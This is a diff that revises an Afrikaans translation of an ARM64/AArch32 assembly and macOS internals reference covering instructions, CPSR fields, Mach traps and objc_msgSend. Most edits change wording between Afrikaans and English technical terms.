-- **`UXTB X1, W2`** Voeg 0s (unsigned) by ’n byte **van W2 na X1** om die 64 bits te vul
-- **`extr`:** Onttrek bits uit ’n gespesifiseerde **paar aaneengeskakelde registers**.
-- Voorbeeld: `EXTR W3, W2, W1, #3` Dit sal **W1+W2 aaneenskakel** en **vanaf bit 3 van W2 tot by bit 3 van W1** neem en dit in W3 stoor.
-- **`cmp`**: **Vergelyk** twee registers en stel condition flags. Dit is ’n **alias van `subs`** wat die destination register op die zero register stel. Nuttig om te weet of `m == n`.
+- **Bitfield Extract and Insert:** Kopieer 'n bitfield vanaf 'n register en kopieer dit na 'n ander register.
+- **`BFI X1, X2, #3, #4`** Insert 4 bits from X2 from the 3rd bit of X1
+- **`BFXIL X1, X2, #3, #4`** Extract from the 3rd bit of X2 four bits and copy them to X1
+- **`SBFIZ X1, X2, #3, #4`** Sign-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
+- **`SBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2, sign extends them, and places the result in X1
+- **`UBFIZ X1, X2, #3, #4`** Zero-extends 4 bits from X2 and inserts them into X1 starting at bit position 3 zeroing the right bits
+- **`UBFX X1, X2, #3, #4`** Extracts 4 bits starting at bit 3 from X2 and places the zero-extended result in X1.
+- **Sign Extend To X:** Brei die sign uit (of voeg slegs 0s in die unsigned-weergawe by) van 'n waarde om bewerkings daarmee te kan uitvoer:
+- **`SXTB X1, W2`** Brei die sign van 'n byte **van W2 na X1** uit (`W2` is die helfte van `X2`) om die 64bits te vul
+- **`SXTH X1, W2`** Brei die sign van 'n 16bit-getal **van W2 na X1** uit om die 64bits te vul
+- **`SXTW X1, W2`** Brei die sign van 'n byte **van W2 na X1** uit om die 64bits te vul
+- **`UXTB X1, W2`** Voeg 0s (unsigned) by 'n byte **van W2 na X1** om die 64bits te vul
+- **`extr`:** Onttrek bits uit 'n gespesifiseerde **paar registers wat aaneengeskakel is**.
+- Example: `EXTR W3, W2, W1, #3` Dit sal **W1+W2 concat** en **vanaf bit 3 van W2 tot by bit 3 van W1** verkry en dit in W3 stoor.
+- **`cmp`**: **Vergelyk** twee registers en stel condition flags. Dit is 'n **alias van `subs`** wat die destination register op die zero register stel. Nuttig om te weet of `m == n`.
 - Dit ondersteun dieselfde syntax as `subs`
-- Voorbeeld: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die condition flags dienooreenkomstig.
-- **`cmn`**: **Vergelyk negatiewe** operand. In hierdie geval is dit ’n **alias van `adds`** en ondersteun dit dieselfde syntax. Nuttig om te weet of `m == -n`.
-- **`ccmp`**: Conditional comparison; dit is ’n comparison wat slegs uitgevoer word as ’n vorige comparison waar was, en dit stel die nzcv-bits spesifiek.
+- Example: `cmp x0, x1` — Dit vergelyk die waardes in `x0` en `x1` en stel die condition flags dienooreenkomstig.
+- **`cmn`**: **Compare negative** operand. In hierdie geval is dit 'n **alias van `adds`** en ondersteun dit dieselfde syntax. Nuttig om te weet of `m == -n`.
+- **`ccmp`**: Conditional comparison; dit is 'n comparison wat slegs uitgevoer word as 'n vorige comparison waar was en wat die nzcv-bits spesifiek stel.
 - `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> as x1 != x2 en x3 < x4, spring na func
-- Dit is omdat **`ccmp`** slegs uitgevoer sal word as die **vorige `cmp` ’n `NE` was**. Indien nie, word die `nzcv`-bits op 0 gestel (wat nie aan die `blt`-comparison sal voldoen nie).
-- Dit kan ook as `ccmn` gebruik word (dieselfde, maar negatief, soos `cmp` teenoor `cmn`).
-- **`tst`**: Dit kontroleer of enige van die waardes in die comparison albei 1 is (dit werk soos ’n ANDS sonder om die resultaat êrens te stoor). Dit is nuttig om ’n register met ’n waarde te toets en te kontroleer of enige bits van die register wat deur die waarde aangedui word, 1 is.
-- Voorbeeld: `tst X1, #7` Kontroleer of enige van die laaste 3 bits van X1 1 is
+- Dit is omdat **`ccmp`** slegs uitgevoer word as die **vorige `cmp` 'n `NE` was**; indien nie, word die `nzcv`-bits op 0 gestel (wat nie aan die `blt`-comparison sal voldoen nie).
+- Dit kan ook as `ccmn` gebruik word (dieselfde maar negatief, soos `cmp` teenoor `cmn`).
+- **`tst`**: Dit kontroleer of enige van die waardes in die comparison albei 1 is (dit werk soos 'n ANDS sonder om die resultaat êrens te stoor). Dit is nuttig om 'n register met 'n waarde te kontroleer en te bepaal of enige van die bits in die register wat deur die waarde aangedui word, 1 is.
+- Example: `tst X1, #7` Kontroleer of enige van die laaste 3 bits van X1 1 is
 - **`teq`**: XOR-bewerking wat die resultaat weggooi
 - **`b`**: Unconditional Branch
-- Voorbeeld: `b myFunction`
+- Example: `b myFunction`
 - Let daarop dat dit nie die link register met die return address sal vul nie (nie geskik vir subroutine calls wat moet terugkeer nie)
-- **`bl`**: **Branch** with link, wat gebruik word om ’n **subroutine** te **roep**. Stoor die **return address in `x30`**.
-- Voorbeeld: `bl myFunction` — Dit roep die function `myFunction` en stoor die return address in `x30`.
+- **`bl`**: **Branch** with link, gebruik om 'n **subroutine** te **roep**. Stoor die **return address in `x30`**.
+- Example: `bl myFunction` — Dit roep die funksie `myFunction` en stoor die return address in `x30`.
 - Let daarop dat dit nie die link register met die return address sal vul nie (nie geskik vir subroutine calls wat moet terugkeer nie)
-- **`blr`**: **Branch** with Link to Register, wat gebruik word om ’n **subroutine** te **roep** waar die target in ’n **register** gespesifiseer word. Stoor die return address in `x30`. (Dit is
-- Voorbeeld: `blr x1` — Dit roep die function waarvan die address in `x1` vervat is en stoor die return address in `x30`.
-- **`ret`**: **Return** van ’n **subroutine**, gewoonlik met die address in **`x30`**.
-- Voorbeeld: `ret` — Dit keer terug van die huidige subroutine met die return address in `x30`.
+- **`blr`**: **Branch** with Link to Register, gebruik om 'n **subroutine** te **roep** waar die target in 'n **register** gespesifiseer word. Stoor die return address in `x30`. (This is
+- Example: `blr x1` — Dit roep die funksie waarvan die adres in `x1` vervat is en stoor die return address in `x30`.
+- **`ret`**: **Return** van 'n **subroutine**, tipies deur die adres in **`x30`** te gebruik.
+- Example: `ret` — Dit keer terug vanaf die huidige subroutine deur die return address in `x30` te gebruik.
 - **`b.<cond>`**: Conditional branches
-- **`b.eq`**: **Branch if equal**, gebaseer op die vorige `cmp`-instruksie.
-- Voorbeeld: `b.eq label` — As die vorige `cmp`-instruksie twee gelyke waardes gevind het, spring dit na `label`.
-- **`b.ne`**: **Branch if Not Equal**. Hierdie instruksie kontroleer die condition flags (wat deur ’n vorige comparison-instruksie gestel is), en as die vergelykte waardes nie gelyk was nie, branch dit na ’n label of address.
-- Voorbeeld: Na ’n `cmp x0, x1`-instruksie, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
-- **`cbz`**: **Compare and Branch on Zero**. Hierdie instruksie vergelyk ’n register met zero en branch na ’n label of address as hulle gelyk is.
-- Voorbeeld: `cbz x0, label` — As die waarde in `x0` zero is, spring dit na `label`.
-- **`cbnz`**: **Compare and Branch on Non-Zero**. Hierdie instruksie vergelyk ’n register met zero en branch na ’n label of address as hulle nie gelyk is nie.
-- Voorbeeld: `cbnz x0, label` — As die waarde in `x0` nie zero is nie, spring dit na `label`.
-- **`tbnz`**: Toets bit en branch indien dit nie zero is nie
-- Voorbeeld: `tbnz x0, #8, label`
-- **`tbz`**: Toets bit en branch indien dit zero is
-- Voorbeeld: `tbz x0, #8, label`
+- **`b.eq`**: **Branch if equal**, gebaseer op die vorige `cmp`-instruction.
+- Example: `b.eq label` — As die vorige `cmp`-instruction twee gelyke waardes gevind het, spring dit na `label`.
+- **`b.ne`**: **Branch if Not Equal**. Hierdie instruction kontroleer die condition flags (wat deur 'n vorige comparison-instruction gestel is), en as die vergelykte waardes nie gelyk was nie, spring dit na 'n label of address.
+- Example: Na 'n `cmp x0, x1`-instruction, `b.ne label` — As die waardes in `x0` en `x1` nie gelyk was nie, spring dit na `label`.
+- **`cbz`**: **Compare and Branch on Zero**. Hierdie instruction vergelyk 'n register met zero, en as hulle gelyk is, spring dit na 'n label of address.
+- Example: `cbz x0, label` — As die waarde in `x0` zero is, spring dit na `label`.
+- **`cbnz`**: **Compare and Branch on Non-Zero**. Hierdie instruction vergelyk 'n register met zero, en as hulle nie gelyk is nie, spring dit na 'n label of address.
+- Example: `cbnz x0, label` — As die waarde in `x0` nie-zero is nie, spring dit na `label`.
+- **`tbnz`**: Test bit and branch on nonzero
+- Example: `tbnz x0, #8, label`
+- **`tbz`**: Test bit and branch on zero
+- Example: `tbz x0, #8, label`
 - **Conditional select operations**: Dit is bewerkings waarvan die gedrag volgens die conditional bits wissel.
-- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Indien waar, X0 = X1; indien vals, X0 = X2
-- `csinc Xd, Xn, Xm, cond` -> Indien waar, Xd = Xn; indien vals, Xd = Xm + 1
-- `cinc Xd, Xn, cond` -> Indien waar, Xd = Xn + 1; indien vals, Xd = Xn
-- `csinv Xd, Xn, Xm, cond` -> Indien waar, Xd = Xn; indien vals, Xd = NOT(Xm)
-- `cinv Xd, Xn, cond` -> Indien waar, Xd = NOT(Xn); indien vals, Xd = Xn
-- `csneg Xd, Xn, Xm, cond` -> Indien waar, Xd = Xn; indien vals, Xd = - Xm
-- `cneg Xd, Xn, cond` -> Indien waar, Xd = - Xn; indien vals, Xd = Xn
-- `cset Xd, Xn, Xm, cond` -> Indien waar, Xd = 1; indien vals, Xd = 0
-- `csetm Xd, Xn, Xm, cond` -> Indien waar, Xd = \<all 1>; indien vals, Xd = 0
-- **`adrp`**: Bereken die **page address van ’n symbol** en stoor dit in ’n register.
-- Voorbeeld: `adrp x0, symbol` — Dit bereken die page address van `symbol` en stoor dit in `x0`.
-- **`ldrsw`**: **Load** ’n signed **32-bit**-waarde uit memory en **sign-extend dit na 64** bits. Dit word vir algemene SWITCH-cases gebruik.
-- Voorbeeld: `ldrsw x0, [x1]` — Dit laai ’n signed 32-bit-waarde vanaf die memory location waarna `x1` wys, sign-extend dit na 64 bits en stoor dit in `x0`.
-- **`stur`**: **Store ’n registerwaarde na ’n memory location**, met ’n offset vanaf ’n ander register.
-- Voorbeeld: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die memory address wat 4 bytes groter is as die address wat tans in `x1` is.
-- **`svc`**: Maak ’n **system call**. Dit staan vir "Supervisor Call". Wanneer die processor hierdie instruksie uitvoer, **skakel dit van user mode na kernel mode** en spring dit na ’n spesifieke memory location waar die **kernel se system call handling**-code geleë is.
+- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> As waar, X0 = X1; as vals, X0 = X2
+- `csinc Xd, Xn, Xm, cond` -> As waar, Xd = Xn; as vals, Xd = Xm + 1
+- `cinc Xd, Xn, cond` -> As waar, Xd = Xn + 1; as vals, Xd = Xn
+- `csinv Xd, Xn, Xm, cond` -> As waar, Xd = Xn; as vals, Xd = NOT(Xm)
+- `cinv Xd, Xn, cond` -> As waar, Xd = NOT(Xn); as vals, Xd = Xn
+- `csneg Xd, Xn, Xm, cond` -> As waar, Xd = Xn; as vals, Xd = - Xm
+- `cneg Xd, Xn, cond` -> As waar, Xd = - Xn; as vals, Xd = Xn
+- `cset Xd, Xn, Xm, cond` -> As waar, Xd = 1; as vals, Xd = 0
+- `csetm Xd, Xn, Xm, cond` -> As waar, Xd = \<all 1>; as vals, Xd = 0
+- **`adrp`**: Bereken die **page address van 'n symbol** en stoor dit in 'n register.
+- Example: `adrp x0, symbol` — Dit bereken die page address van `symbol` en stoor dit in `x0`.
+- **`ldrsw`**: **Load** 'n signed **32-bit**-waarde uit memory en **sign-extend dit na 64** bits. Dit word vir algemene SWITCH-cases gebruik.
+- Example: `ldrsw x0, [x1]` — Dit laai 'n signed 32-bit-waarde vanaf die memory location waarna `x1` wys, sign-extend dit na 64 bits en stoor dit in `x0`.
+- **`stur`**: **Store 'n register value na 'n memory location**, deur 'n offset vanaf 'n ander register te gebruik.
+- Example: `stur x0, [x1, #4]` — Dit stoor die waarde in `x0` in die memory address wat 4 bytes groter is as die address wat tans in `x1` is.
+- **`svc`** : Maak 'n **system call**. Dit staan vir "Supervisor Call". Wanneer die processor hierdie instruction uitvoer, **skakel dit van user mode na kernel mode** en spring dit na 'n spesifieke memory location waar die **kernel se system call handling**-code is.
 
-- Voorbeeld:
+- Example:
 
 ```armasm
-mov x8, 93  ; Laai die system call number vir exit (93) in register x8.
-mov x0, 0   ; Laai die exit status code (0) in register x0.
-svc 0       ; Maak die system call.
+mov x8, 93  ; Load the system call number for exit (93) into register x8.
+mov x0, 0   ; Load the exit status code (0) into register x0.
+svc 0       ; Make the system call.
 ```
 
 ### **Function Prologue**
@@ -239,13 +239,13 @@ svc 0       ; Maak die system call.
 ```armasm
 stp x29, x30, [sp, #-16]!  ; store pair x29 and x30 to the stack and decrement the stack pointer
 ```
-2. **Stel die nuwe raamwyser op**: `mov x29, sp` (stel die nuwe raamwyser vir die huidige funksie op)
-3. **Ken ruimte op die stack toe vir plaaslike veranderlikes** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal benodigde grepe is)
+2. **Stel die nuwe frame pointer op**: `mov x29, sp` (stel die nuwe frame pointer vir die huidige funksie op)
+3. **Ken ruimte op die stack vir plaaslike veranderlikes toe** (indien nodig): `sub sp, sp, <size>` (waar `<size>` die aantal benodigde grepe is)
 
 ### **Funksie-epiloog**
 
-1. **Deallokeer plaaslike veranderlikes** (indien enige toegewys is): `add sp, sp, <size>`
-2. **Herstel die skakelregister en raamwyser**:
+1. **Maak plaaslike veranderlikes vry (indien enige toegewys is)**: `add sp, sp, <size>`
+2. **Herstel die link register en frame pointer**:
 ```armasm
 ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment the stack pointer
 ```
@@ -259,12 +259,12 @@ ldp x29, x30, [sp], #16  ; load pair x29 and x30 from the stack and increment th
 
 ## AARCH32 Execution State
 
-Armv8-A ondersteun die uitvoering van 32-bit-programme. **AArch32** kan in een van **twee instruction sets** loop: **`A32`** en **`T32`**, en kan tussen hulle wissel via **`interworking`**.\
-**Privileged** 64-bit-programme kan die **uitvoering van 32-bit**-programme skeduleer deur ’n exception level-oordrag na die laer privileged 32-bit uit te voer.\
-Let daarop dat die oorgang van 64-bit na 32-bit plaasvind met ’n verlaging van die exception level (byvoorbeeld ’n 64-bit-program in EL1 wat ’n program in EL0 aktiveer). Dit word gedoen deur die **bit 4 van** die **`SPSR_ELx`**-spesialeregister **op 1 te stel** wanneer die `AArch32`-proses se thread gereed is om uitgevoer te word, terwyl die res van `SPSR_ELx` die **`AArch32`**-programme se CPSR stoor. Vervolgens roep die privileged proses die **`ERET`**-instruksie aan, sodat die verwerker na **`AArch32`** oorskakel en A32 of T32 betree, afhangend van CPSR**.**
+Armv8-A ondersteun die uitvoering van 32-bit-programme. **AArch32** kan in een van **twee instruction sets** loop: **`A32`** en **`T32`**, en kan tussen hulle wissel deur middel van **`interworking`**.\
+**Privileged** 64-bit-programme kan die **uitvoering van 32-bit**-programme skeduleer deur ’n exception level transfer na die laer privileged 32-bit-vlak uit te voer.\
+Let daarop dat die oorgang van 64-bit na 32-bit plaasvind saam met ’n verlaging van die exception level (byvoorbeeld ’n 64-bit-program in EL1 wat ’n program in EL0 aktiveer). Dit word gedoen deur **bit 4 van** die **`SPSR_ELx`**-special register **op 1 te stel** wanneer die `AArch32`-proses se thread gereed is om uitgevoer te word, terwyl die res van `SPSR_ELx` die **`AArch32`**-program se CPSR stoor. Daarna roep die privileged-proses die **`ERET`**-instruksie aan, sodat die verwerker na **`AArch32`** oorgaan en A32 of T32 betree, afhangend van CPSR**.**
 
-Die **`interworking`** vind plaas deur die J- en T-bits van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`**, en `J=0` en `T=1` beteken **T32**. Dit beteken basies dat die **laagste bit op 1 gestel word** om aan te dui dat die instruction set T32 is.\
-Dit word tydens die **interworking branch instructions** gestel, maar kan ook direk met ander instruksies gestel word wanneer die PC as die bestemmingsregister gebruik word. Voorbeeld:
+Die **`interworking`** vind plaas deur die J- en T-bits van CPSR te gebruik. `J=0` en `T=0` beteken **`A32`**, terwyl `J=0` en `T=1` **T32** beteken. Dit kom basies daarop neer dat die **laagste bit op 1 gestel word** om aan te dui dat die instruction set T32 is.\
+Dit word tydens die **interworking branch instructions** gestel, maar kan ook direk met ander instruksies gestel word wanneer die PC as die destination register gebruik word. Voorbeeld:
 
 Nog ’n voorbeeld:
 ```armasm
@@ -281,22 +281,22 @@ mov r0, #8
 
 Daar is 16 32-bis-registers (r0-r15). **Van r0 tot r14** kan hulle vir **enige bewerking** gebruik word, maar sommige daarvan word gewoonlik gereserveer:
 
-- **`r15`**: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidige + 8, in T32 huidige + 4.
+- **`r15`**: Programteller (altyd). Bevat die adres van die volgende instruksie. In A32 huidig + 8, in T32 huidig + 4.
 - **`r11`**: Raamwyser
 - **`r12`**: Intra-prosedurele oproepregister
-- **`r13`**: Stack Pointer (Let daarop dat die stack altyd 16-byte-belyn is)
-- **`r14`**: Link Register
+- **`r13`**: Stapelwyser (Let daarop dat die stapel altyd 16-grepe-belyn is)
+- **`r14`**: Skakelregister
 
-Verder word registers in **`banked registries`** gerugsteun. Dit is plekke wat die registerwaardes stoor en **vinnige konteksskakeling** in exception handling en bevoorregte bewerkings moontlik maak, sodat dit nie nodig is om registers elke keer handmatig te stoor en te herstel nie.\
-Dit word gedoen deur **die verwerkertoestand van die `CPSR` na die `SPSR`** van die verwerkermodus waarna die exception geneem word, te stoor. Wanneer die exception terugkeer, word die **`CPSR`** vanaf die **`SPSR`** herstel.
+Verder word registers in **`banked registries`** gerugsteun. Dit is plekke wat die registerwaardes stoor en **vinnige kontekstwisseling** tydens uitsonderingshantering en bevoorregte bewerkings moontlik maak, sodat registers nie elke keer handmatig gestoor en herstel hoef te word nie.\
+Dit word gedoen deur **die verwerkerstatus van die `CPSR` na die `SPSR`** van die verwerkermodus waarheen die uitsondering geneem word, te stoor. Wanneer daar van die uitsondering teruggekeer word, word die **`CPSR`** vanaf die **`SPSR`** herstel.
 
-### CPSR - Current Program Status Register
+### CPSR - Huidige Programstatusregister
 
-In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word dit ook in **`SPSR_ELx`** gestoor wanneer ’n exception geneem word, sodat die uitvoering later herstel kan word:
+In AArch32 werk die CPSR soortgelyk aan **`PSTATE`** in AArch64 en word dit ook in **`SPSR_ELx`** gestoor wanneer ’n uitsondering geneem word, sodat die uitvoering later herstel kan word:
 
 <figure><img src="../../../images/image (1197).png" alt=""><figcaption></figcaption></figure>
 
-Die velde word in ’n paar groepe verdeel:
+Die velde word in sommige groepe verdeel:
 
 - Application Program Status Register (APSR): Rekenkundige vlae en toeganklik vanaf EL0
 - Execution State Registers: Prosesgedrag (deur die OS bestuur).
@@ -304,23 +304,23 @@ Die velde word in ’n paar groepe verdeel:
 #### Application Program Status Register (APSR)
 
 - Die **`N`**, **`Z`**, **`C`**, **`V`**-vlae (net soos in AArch64)
-- Die **`Q`**-vlag: Dit word op 1 gestel wanneer **integer saturation plaasvind** tydens die uitvoering van ’n gespesialiseerde saturating arithmetic-instruksie. Sodra dit op **`1`** gestel is, behou dit die waarde totdat dit handmatig op 0 gestel word. Daarbenewens is daar geen instruksie wat die waarde daarvan implisiet kontroleer nie; dit moet gedoen word deur dit handmatig te lees.
-- **`GE`**-vlae (Greater than or equal): Dit word in SIMD- (Single Instruction, Multiple Data)-bewerkings gebruik, soos "parallel add" en "parallel subtract". Hierdie bewerkings laat toe dat verskeie datapunte in ’n enkele instruksie verwerk word.
+- Die **`Q`**-vlag: Dit word op 1 gestel wanneer **heelgetalversadiging** tydens die uitvoering van ’n gespesialiseerde versadigde rekenkundige instruksie plaasvind. Sodra dit op **`1`** gestel is, behou dit die waarde totdat dit handmatig op 0 gestel word. Daarbenewens is daar geen instruksie wat die waarde daarvan implisiet nagaan nie; dit moet gedoen word deur dit handmatig te lees.
+- **`GE`**-vlae (Greater than or equal): Dit word in SIMD-bewerkings (Single Instruction, Multiple Data) gebruik, soos “parallel add” en “parallel subtract”. Hierdie bewerkings maak dit moontlik om verskeie datapunte in ’n enkele instruksie te verwerk.
 
-Byvoorbeeld, die **`UADD8`**-instruksie **tel vier pare grepe** (van twee 32-bis-operande) parallel bymekaar en stoor die resultate in ’n 32-bis-register. Dit **stel dan die `GE`-vlae in die `APSR`** op grond van hierdie resultate. Elke GE-vlag stem ooreen met een van die greep-bewerkings en dui aan of die optelling vir daardie greep-paar **oorloop** het.
+Die **`UADD8`**-instruksie **tel vier pare grepe** (van twee 32-bis-operande) parallel by en stoor die resultate in ’n 32-bis-register. Dit **stel dan die `GE`-vlae in die `APSR`** op grond van hierdie resultate. Elke GE-vlag stem ooreen met een van die greepoptellings en dui aan of die optelling vir daardie greep-paar **oorloop** het.
 
 Die **`SEL`**-instruksie gebruik hierdie GE-vlae om voorwaardelike aksies uit te voer.
 
 #### Execution State Registers
 
-- Die **`J`**- en **`T`**-bisse: **`J`** behoort 0 te wees. As **`T`** 0 is, word die A32-instruksiestel gebruik, en as dit 1 is, word T32 gebruik.
+- Die **`J`**- en **`T`**-bisse: **`J`** moet 0 wees. As **`T`** 0 is, word die A32-instruksiestel gebruik, en as dit 1 is, word T32 gebruik.
 - **IT Block State Register** (`ITSTATE`): Dit is die bisse van 10-15 en 25-26. Hulle stoor toestande vir instruksies binne ’n groep met ’n **`IT`**-voorvoegsel.
 - **`E`**-bis: Dui die **endianness** aan.
-- **Mode and Exception Mask Bits** (0-4): Hulle bepaal die huidige uitvoeringstoestand. Die 5de een dui aan of die program as 32-bis (’n 1) of 64-bis (’n 0) loop. Die ander 4 verteenwoordig die **exception mode** wat tans gebruik word (wanneer ’n exception plaasvind en hanteer word). Die ingestelde getal **dui die huidige prioriteit aan** indien nog ’n exception geaktiveer word terwyl hierdie een hanteer word.
+- **Mode and Exception Mask Bits** (0-4): Hulle bepaal die huidige uitvoeringstoestand. Die 5de een dui aan of die program as 32-bis (’n 1) of 64-bis (’n 0) loop. Die ander 4 stel die **uitsonderingsmodus wat tans gebruik word** voor (wanneer ’n uitsondering plaasvind en dit hanteer word). Die ingestelde getal **dui die huidige prioriteit aan** ingeval nog ’n uitsondering geaktiveer word terwyl hierdie een hanteer word.
 
 <figure><img src="../../../images/image (1200).png" alt=""><figcaption></figcaption></figure>
 
-- **`AIF`**: Sekere exceptions kan met die bisse **`A`**, `I`, `F` gedeaktiveer word. As **`A`** 1 is, beteken dit dat **asynchronous aborts** geaktiveer sal word. Die **`I`** stel die reaksie op eksterne hardeware-**Interrupts Requests** (IRQs) in. Die `F` hou verband met **Fast Interrupt Requests** (FIRs).
+- **`AIF`**: Sekere uitsonderings kan met die bisse **`A`**, `I`, `F` gedeaktiveer word. As **`A`** 1 is, beteken dit dat **asynchrone afbrekings** geaktiveer sal word. Die **`I`** stel die reaksie op eksterne hardeware-**Interrupts Requests** (IRQ’s) op. En die F hou verband met **Fast Interrupt Requests** (FIR’s).
 
 ## macOS
 
@@ -330,9 +330,9 @@ Kyk na [**syscalls.master**](https://opensource.apple.com/source/xnu/xnu-1504.3.
 
 ### Mach Traps
 
-Kyk in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) na die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) na die prototipes. Die mex-getal van Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, dus moet jy die getalle uit die vorige lys met ’n **minus** oproep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
+Kyk in [**syscall_sw.c**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/kern/syscall_sw.c.auto.html) na die `mach_trap_table` en in [**mach_traps.h**](https://opensource.apple.com/source/xnu/xnu-3789.1.32/osfmk/mach/mach_traps.h) na die prototipes. Die maksimum aantal Mach traps is `MACH_TRAP_TABLE_COUNT` = 128. Mach traps sal **x16 < 0** hê, dus moet jy die nommers uit die vorige lys met ’n **minus** oproep: **`_kernelrpc_mach_vm_allocate_trap`** is **`-10`**.
 
-Jy kan ook **`libsystem_kernel.dylib`** in ’n disassembler nagaan om te sien hoe om hierdie (en BSD) syscalls op te roep:
+Jy kan ook **`libsystem_kernel.dylib`** in ’n disassembler nagaan om te sien hoe om hierdie (en BSD) syscalls aan te roep:
 ```bash
 # macOS
 dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Library/dyld/dyld_shared_cache_arm64e
@@ -340,32 +340,32 @@ dyldex -e libsystem_kernel.dylib /System/Volumes/Preboot/Cryptexes/OS/System/Lib
 # iOS
 dyldex -e libsystem_kernel.dylib /System/Library/Caches/com.apple.dyld/dyld_shared_cache_arm64
 ```
-Let daarop dat **Ida** en **Ghidra** ook **spesifieke dylibs** uit die cache kan decompileer deur net die cache deur te gee.
+Let daarop dat **Ida** en **Ghidra** ook **specific dylibs** uit die cache kan decompileer deur eenvoudig die cache deur te gee.
 
 > [!TIP]
-> Soms is dit makliker om die **decompiled** code van **`libsystem_kernel.dylib`** na te gaan **as** om die **source code** na te gaan, omdat die code van verskeie syscalls (BSD en Mach) via scripts gegenereer word (kyk na die kommentare in die source code), terwyl jy in die dylib kan vind wat geroep word.
+> Soms is dit makliker om die **decompiled** kode van **`libsystem_kernel.dylib`** na te gaan **as** om die **source code** na te gaan, omdat die kode van verskeie syscalls (BSD en Mach) deur scripts gegenereer word (kyk na die kommentare in die source code), terwyl jy in die dylib kan sien wat geroep word.
 
 ### machdep calls
 
-XNU ondersteun nog ’n tipe calls wat machine dependent genoem word. Die nommers van hierdie calls hang van die argitektuur af, en nóg die calls nóg die nommers word gewaarborg om konstant te bly.
+XNU ondersteun nog ’n tipe calls genaamd machine dependent. Die nommers van hierdie calls hang van die argitektuur af, en nóg die calls nóg die nommers word gewaarborg om konstant te bly.
 
 ### comm page
 
-Dit is ’n kernel-owned memory page wat in die address space van elke users process gemap word. Dit is bedoel om die oorgang van user mode na kernel space vinniger te maak as wanneer syscalls gebruik word vir kernel services wat so gereeld gebruik word dat hierdie oorgang baie ondoeltreffend sou wees.
+Dit is ’n kernel-owned geheuebladsy wat in die address space van elke gebruiker se proses gemap word. Dit is bedoel om die oorgang van user mode na kernel space vinniger te maak as om syscalls te gebruik vir kernel-dienste wat so gereeld gebruik word dat hierdie oorgang andersins baie ondoeltreffend sou wees.
 
 Byvoorbeeld, die call `gettimeofdate` lees die waarde van `timeval` direk vanaf die comm page.
 
 ### objc_msgSend
 
-Dit is baie algemeen om hierdie funksie in Objective-C- of Swift-programme te vind. Hierdie funksie laat jou toe om ’n method van ’n Objective-C-object te call.
+Dit is baie algemeen om hierdie funksie in Objective-C- of Swift-programme te vind. Hierdie funksie laat jou toe om ’n metode van ’n Objective-C-objek te roep.
 
 Parameters ([more info in the docs](https://developer.apple.com/documentation/objectivec/1456712-objc_msgsend)):
 
-- x0: self -> Pointer na die instance
-- x1: op -> Selector van die method
-- x2... -> Die res van die arguments van die invoked method
+- x0: self -> Pointer na die instansie
+- x1: op -> Selector van die metode
+- x2... -> Die res van die argumente van die geroepte metode
 
-Dus, as jy ’n breakpoint voor die branch na hierdie funksie plaas, kan jy maklik in lldb vind wat invoked word (in hierdie voorbeeld call die object ’n object van `NSConcreteTask` wat ’n command sal run):
+As jy dus ’n breakpoint voor die branch na hierdie funksie plaas, kan jy maklik in lldb sien wat geroep word (in hierdie voorbeeld roep die objek ’n objek van `NSConcreteTask` aan wat ’n command sal uitvoer):
 ```bash
 # Right in the line were objc_msgSend will be called
 (lldb) po $x0
@@ -384,26 +384,26 @@ whoami
 )
 ```
 > [!TIP]
-> Deur die env-veranderlike **`NSObjCMessageLoggingEnabled=1`** te stel, is dit moontlik om aan te teken wanneer hierdie funksie geroep word in 'n lêer soos `/tmp/msgSends-pid`.
+> Deur die env variable **`NSObjCMessageLoggingEnabled=1`** te stel, is dit moontlik om aan te teken wanneer hierdie funksie in ’n lêer soos `/tmp/msgSends-pid` geroep word.
 >
-> Verder, deur **`OBJC_HELP=1`** te stel en enige binary aan te roep, kan jy ander omgewingsveranderlikes sien wat jy kan gebruik om aan te teken wanneer sekere Objc-C-aksies plaasvind.
+> Verder, deur **`OBJC_HELP=1`** te stel en enige binary te roep, kan jy ander environment variables sien wat jy kan gebruik om aan te teken wanneer sekere Objc-C-aksies plaasvind.
 
-Wanneer hierdie funksie geroep word, is dit nodig om die geroepte metode van die aangeduide instansie te vind. Hiervoor word verskeie soektogte uitgevoer:
+Wanneer hierdie funksie geroep word, moet die geroepe metode van die aangeduide instance gevind word. Hiervoor word verskeie searches uitgevoer:
 
-- Voer optimistiese cache-opsoek uit:
+- Voer optimistic cache lookup uit:
 - Indien suksesvol, klaar
-- Verkry runtimeLock (lees)
-- Indien (realize && !cls->realized), realize klas
-- Indien (initialize && !cls->initialized), initialize klas
-- Probeer klas se eie cache:
+- Verkry runtimeLock (read)
+- Indien (realize && !cls->realized), realize class
+- Indien (initialize && !cls->initialized), initialize class
+- Probeer die class se eie cache:
 - Indien suksesvol, klaar
-- Probeer klas se metodelys:
+- Probeer die class method list:
 - Indien gevind, vul cache en klaar
-- Probeer superclass se cache:
+- Probeer superclass cache:
 - Indien suksesvol, klaar
-- Probeer superclass se metodelys:
+- Probeer superclass method list:
 - Indien gevind, vul cache en klaar
-- Indien (resolver), probeer method resolver, en herhaal vanaf klas-opsoek
+- Indien (resolver), probeer method resolver, en herhaal vanaf class lookup
